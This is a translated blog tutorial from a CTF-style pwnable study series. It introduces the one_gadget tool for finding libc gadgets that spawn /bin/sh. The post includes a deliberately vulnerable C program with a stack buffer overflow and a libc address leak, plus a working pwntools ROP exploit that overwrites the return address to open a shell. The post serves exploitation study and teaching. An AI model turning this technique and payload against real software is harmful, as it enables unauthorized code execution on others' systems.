---
title: "[PWNABLE] One_Gadget"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ It is a tool that finds the part that executes a cell such as execve('/bin/sh',0,0) in the libc file. In other words, if one_gadget is entered in the ret position of the stack, you can immediately obtain the shell. How to install gem ins"
date: "2024-06-24"
translation_key: "tistory-f16b9482209a"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-OneGadget"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

This is a tool that finds the part that executes a cell such as execve('/bin/sh',0,0) in the libc file.

In other words, if one\_gadget is entered in the ret position of the stack, you can immediately obtain the shell.

#### Installation method

```
gem install one_gadget
```

![](/assets/images/tistory/tistory-f16b9482209a/001.png)

Usually places like ctf provide libc files, but since we will be using an example, we will try using a local libc file.

To use it, just use it as shown in the image.

```
one_gadget {libc}
```

It says there are a total of 4 one\_gadgets.

You could say that they are all the same, but the functions are the same, but the situations in which they can be used are different.

For example, in order to use 0x50a47 at the top, the result of rsp & 0xf must be 0, and rcx and rbp must have 0x0.

This one\_gadget may seem like a fraudulent method, but it can only be used in situations where the conditions are met.

Let’s take a look at the example below.

```
//gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void gift(){
	__asm__ ("pop %rcx");
	__asm__ ("ret");
}

int vuln(){
	char buf[100];
	printf("Hello! whrd\n");
	printf("stdout = %p\n",stdout);
	read(0,buf,256);
	printf("Good bye!\n");

	return 0;
}

int main(){
	initialize();
	vuln();

	return 0;
}
```

Set a breakpoint at ret of vuln() in the compiled ex file.

![](/assets/images/tistory/tistory-f16b9482209a/002.png)

This is the state when stopped at ret of vuln(). Let's check if there is one\_gadget available here.

Hmm... All one\_gadgets cannot be used because the conditions are not met.

In this case, you can set the conditions arbitrarily.

Looking at the code, a gadget called pop rcx was created to meet the conditions of the first one\_gadget.

I will try to use this to save it.

(Because it outputs the address of stdout, you can import and use libc's gadget without having to create a gadget.)

This is a rop payload using one\_gadget.

```
from pwn import *

target = b'./ex'

p = process(target)
e = ELF(target)
libc = ELF(b'/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil(b'= ')
leak = int(p.recvn(14),16)

p_rcx = 0x00000000004011e5
ret = 0x000000000040101a
libc_base = leak - libc.sym['_IO_2_1_stdout_']
one = [0x50a47, 0xebc81, 0xebc85, 0xebc88]

print(hex(libc_base))

payload = b'a'*0x70
payload += p64(0x0)
payload += p64(p_rcx)
payload += p64(0x0)
payload += p64(libc_base + one[0])

p.send(payload)

p.interactive()
```

There is a process to set rbp and rcx to null, and one\_gadget is entered in ret to obtain a shell. It becomes possible.

![](/assets/images/tistory/tistory-f16b9482209a/003.png)